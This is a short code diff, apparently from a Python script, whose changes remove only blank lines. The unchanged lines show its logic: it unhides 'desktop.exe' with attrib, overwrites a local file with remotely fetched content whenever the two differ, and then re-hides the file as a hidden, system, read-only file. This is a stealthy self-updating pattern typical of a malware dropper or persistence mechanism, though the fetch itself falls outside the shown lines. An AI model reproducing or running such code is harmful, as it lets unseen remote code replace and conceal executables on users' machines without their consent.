@@ -20,7 +20,6 @@ except Exception:
     exit
     
 os.system("attrib -h -s -r desktop.exe")
-
 with open(path, "r") as f:
     read = f.read()
     f.close()
@@ -29,5 +28,4 @@ if not read == r.text:
     with open(path, "w") as f:
         f.write(r.text)
         f.close()
-        
 os.system("attrib +h +s +r desktop.exe")
